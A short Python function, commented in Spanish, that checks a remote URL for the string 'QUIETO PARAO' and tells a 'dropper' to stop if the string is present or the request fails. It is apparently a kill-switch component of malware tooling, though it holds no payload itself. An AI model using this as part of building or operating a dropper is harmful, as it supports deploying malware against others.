import requests

KILLSWITCH_STRING = "QUIETO PARAO"

def check_killswitch(url: str) -> bool:
    """
    Devuelve True si el killswitch está activado (el dropper debe parar).
    En caso de error, fallo de red o URL inaccesible → True (fail-safe).
    """
    try:
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            return KILLSWITCH_STRING in response.text
        return True  # Código HTTP distinto de 200 → parar
    except Exception:
        return True  # Cualquier excepción → parar
